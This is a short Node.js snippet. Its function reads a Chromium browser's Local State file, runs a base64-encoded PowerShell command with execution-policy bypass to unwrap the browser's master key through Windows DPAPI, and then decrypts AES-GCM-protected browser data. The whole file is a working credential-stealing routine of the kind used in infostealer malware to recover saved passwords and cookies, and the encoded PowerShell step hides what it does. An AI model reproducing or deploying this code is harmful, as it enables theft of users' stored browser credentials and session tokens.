/*
path should be the path to the local state file of the chromium based browser,
data should be a buffer. the function returns a promise that returns the decrypted 
data as a buffer.
add the following:
const fs = require('fs')
const { exec } = require('child_process');
const crypto = require('crypto')
*/
function chromeDecrypt(path, data) {
    return new Promise((resolve) => {
        exec('powershell -exec bypass -enc ' + Buffer.from("Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('" + Buffer.from(JSON.parse(fs.readFileSync(path, 'utf8')).os_crypt.encrypted_key, 'base64').subarray(5).toString('base64') + "'), $null, 'CurrentUser'))", 'utf16le').toString('base64'), (error, stdout) => {
            var decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(stdout.trim(), 'base64'), data.subarray(3, 15));
            decipher.setAuthTag(data.subarray(data.length - 16));
            var decrypted = decipher.update(data.subarray(15, data.length - 16))
            resolve(Buffer.concat([decrypted, decipher.final()]));
        });
    });
}
